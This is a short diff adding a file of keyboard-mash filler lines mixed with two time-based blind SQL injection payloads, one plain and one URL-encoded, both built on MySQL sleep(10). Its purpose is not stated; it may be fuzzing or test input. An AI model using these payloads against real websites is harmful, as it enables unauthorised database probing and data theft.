@@ -1,0 +1,6 @@
+asdsad
+sadasdsad
+'+(select*from(select(if(1=1,sleep(10),false)))a)+
+sadsd
+asds
+0%22XOR(if(now()%3dsysdate()%2Csleep(10)%2C0))XOR%22Z
